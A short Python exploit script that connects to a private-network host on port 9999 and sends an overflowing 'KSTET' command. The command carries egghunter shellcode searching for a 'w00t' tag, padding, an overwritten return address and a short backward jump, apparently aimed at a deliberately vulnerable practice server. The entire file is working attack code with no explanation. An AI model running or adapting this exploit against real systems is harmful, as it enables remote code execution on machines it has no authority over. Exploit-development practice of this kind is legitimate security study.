#!/usr/bin/env python

import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

message  = "KSTET "
message += '\x90' * 8

buf  = "\x50\x5c"
buf += "\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58"
buf += "\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x41\x30\x30\x57" 
buf += "\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

message += buf
message += '\x42' * 26
message += '\xaf\x11\x50\x62' 
message += '\xeb\xbc'
message += "\n"

s.send(message)
s.close()
